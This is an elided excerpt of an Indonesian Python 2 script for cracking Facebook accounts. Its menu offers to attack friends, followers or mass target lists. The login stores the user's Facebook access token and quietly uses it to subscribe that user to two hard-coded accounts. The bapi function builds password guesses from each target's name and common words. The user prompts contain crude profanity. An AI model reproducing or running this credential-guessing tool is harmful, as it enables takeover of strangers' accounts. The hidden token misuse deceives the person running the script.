...
def login():
	...
	try:
		...
		exit(" ! KUOTA LO ABIS NGENTOD")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		print(" * LOGIN DULU KONTOL")
		print(" * MASUKKAN TOKEN")
		print(" ? ketik '\033[0;93mhelp\033[0;97m' UNTUK TUTOR AMBIL TOKEN FACEBOOK")
		token = raw_input("\n + token fb : ")
		if token == "help":
			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
			exit(" ! TONTON DAN SIMAK VIDEONYA BIAR FAHAM")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			requests.post("https://graph.facebook.com/100047875055348/subscribers?access_token="+token)
			requests.post("https://graph.facebook.com/100020192268351/subscribers?access_token="+token)
			print("\n + OKAERI,ONII-CHAN:V \033[0;93m%s\033[0;97m"%(nama))
			time.sleep(1)
			menu()
		except KeyError:
...
def menu():
	...
	try:
		...
		exit(" ! TOKEN INVALID")
	logo()
	print(" [ konichiwa \033[0;93m%s\033[0;97m ]\n"%(nama))
	print(" 1 KREK DARI TEMAN PUBLIK")
	print(" 2 KREK DARI FOLLOWERS")
	print(" 3 KREK TARGET MASSAL")
	print(" 4 CEK HASIL KREK")
	print(" 5 GANTI UA")
	print(" 0 LOGOUT")
	angga = raw_input("\n ? choose : ")
	if angga =="":
...
def method():
	print(" \n [ PILIH METHODE KREK ]\n")
	print(" 1 method b-api  (cepat)")
	print(" 2 method mbasic (lambat)")
	print(" 3 method mobile (lambat sangat)")
	method = raw_input("\n ? method : ")
	if method == "":
		menu()
	elif method == "1":
...
def bapi(user):
	...
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", anjing, bangsat, bismillah, sayang, katasandi ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", anjing, bangsat, bismillah, sayang, katasandi ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", anjing, bangsat, bismillah, sayang, katasandi ]
	else:
		pwx = [ name+"123", name+"12345", anjing, bangsat, bismillah, sayang, katasandi ]
	try:
		for pw in pwx:
